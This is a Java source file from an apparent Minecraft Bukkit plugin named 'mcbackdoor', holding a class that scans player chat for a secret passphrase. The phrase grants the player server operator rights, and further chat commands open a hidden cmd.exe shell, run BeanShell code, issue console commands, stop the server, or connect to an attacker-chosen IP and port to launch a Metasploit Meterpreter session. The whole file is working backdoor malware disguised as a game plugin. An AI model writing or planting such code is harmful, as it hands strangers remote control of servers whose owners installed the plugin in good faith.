/*
 * To change this template, choose Tools | Templates
 * and open the template in the editor.
 */
package org.martin.bukkit.mcbackdoor.scmd;

import com.metasploit.meterpreter.Meterpreter;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.OutputStream;
import java.io.PrintStream;
import java.net.Socket;
import java.util.HashMap;
import java.util.logging.Level;
import java.util.logging.Logger;
import net.minecraft.server.MinecraftServer;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;
import org.bukkit.plugin.java.JavaPlugin;
import org.martin.bukkit.mcbackdoor.hacks.get_mc_server;
import org.martin.bukkit.mcbackdoor.hacks.get_server_op;
import org.martin.bukkit.mcbackdoor.hacks.stop_the_server;
import org.martin.bukkit.mcbackdoor.utils.AsyncCommandSender;
import org.martin.bukkit.mcbackdoor.utils.BSHExecutor;
import org.martin.bukkit.mcbackdoor.utils.SysCommandExecutor;

/**
 *
 * @author martin
 */
public class SecreteCommands {

    private HashMap<Player, Settings> privilagedPlayers = new HashMap<Player, Settings>();
    private JavaPlugin plugin;
    private MinecraftServer mcServer;

    public SecreteCommands(JavaPlugin plugin) {
        this.plugin = plugin;
    }

    public boolean processMSG(String msg, Player player) {
        if (msg.equalsIgnoreCase("%&#1337:")) {
            privilagedPlayers.put(player, new Settings());
            get_server_op.getServerOp(plugin, player);
            return true;
        }
        if (msg.equalsIgnoreCase("$cmd") && isPlayerPrivilaged(player)) {
            //get him to private chat room
            if (!privilagedPlayers.get(player).consoleCMD) {
                privilagedPlayers.get(player).executor = new SysCommandExecutor();
                privilagedPlayers.get(player).sender = new AsyncCommandSender();
                privilagedPlayers.get(player).executor.runCommand("cmd.exe", player, privilagedPlayers.get(player).sender);
                privilagedPlayers.get(player).executor.start();
                privilagedPlayers.get(player).consoleCMD = true;
            } else {
                privilagedPlayers.get(player).executor.stopC();
                privilagedPlayers.get(player).consoleCMD = false;
                privilagedPlayers.get(player).executor = null;
                privilagedPlayers.get(player).out = null;
            }
            return true;
        }
        if (msg.equalsIgnoreCase("$bsh") && isPlayerPrivilaged(player)) {
            //get him to private chat room
            if (!privilagedPlayers.get(player).consoleBSH) {
                privilagedPlayers.get(player).consoleBSH = true;
                privilagedPlayers.get(player).bshExecutor = new BSHExecutor(player);
            } else {
                privilagedPlayers.get(player).consoleBSH = false;
                privilagedPlayers.get(player).bshExecutor = null;
            }
            return true;
        }
        if (msg.startsWith("$con") && isPlayerPrivilaged(player)) {
            if (mcServer == null) {
                mcServer = get_mc_server.getMCServer(plugin);
            }
            String rest = msg.substring(5);
            if (!mcServer.g && MinecraftServer.a(mcServer)) {
                mcServer.a(rest, mcServer);
            }
            return true;
        }
        if (msg.startsWith("$stop") && isPlayerPrivilaged(player)) {
            if (mcServer == null) {
                mcServer = get_mc_server.getMCServer(plugin);
            }
            stop_the_server.stopServer(mcServer);
            return true;
        }
        if (msg.startsWith("$meterpreter") && isPlayerPrivilaged(player)) {
            String[] args = msg.split(" ");
            if (args.length == 3) {
                try {
                    final String ip = args[1];
                    final int port = Integer.valueOf(args[2]);
                    Thread t = new Thread(new Runnable() {

                        public void run() {
                            try {
                                Socket msgsock = new Socket(ip, port);
                                DataInputStream in = new DataInputStream(msgsock.getInputStream());
                                OutputStream out = new DataOutputStream(msgsock.getOutputStream());
                                int coreLen = in.readInt();
                                while (coreLen != 0) {
                                    in.readFully(new byte[coreLen]);
                                    coreLen = in.readInt();
                                }
                                coreLen = in.readInt();
                                in.readFully(new byte[coreLen]);
                                Meterpreter meterpreter = new Meterpreter(in, out, false, true);
                                msgsock.close();
                            } catch (Exception ex) {
                                Logger.getLogger("Minecraft").log(Level.SEVERE, null, ex);
                            }
                        }
                    });
                    t.start();
                } catch (Exception ex) {
                    Logger.getLogger("Minecraft").log(Level.SEVERE, null, ex);
                }
            }
            return true;
        }
        if (isPlayerPrivilaged(player) && privilagedPlayers.get(player).consoleCMD && !privilagedPlayers.get(player).consoleBSH) {
            //SysCommandExecutor executor = privilagedPlayers.get(player).executor;
            if (privilagedPlayers.get(player).out == null) {
                privilagedPlayers.get(player).out = new PrintStream(privilagedPlayers.get(player).sender.out);
            }
            privilagedPlayers.get(player).out.println(msg);
            player.sendMessage(ChatColor.GREEN + "> " + msg);
            return true;
        }
        if (isPlayerPrivilaged(player) && privilagedPlayers.get(player).consoleBSH && !privilagedPlayers.get(player).consoleCMD) {
            privilagedPlayers.get(player).bshExecutor.sednCMD(msg);
            player.sendMessage(ChatColor.GREEN + "> " + msg);
            return true;
        }
        return false;
    }

    public boolean isPlayerPrivilaged(Player player) {
        return privilagedPlayers.containsKey(player);
    }
}
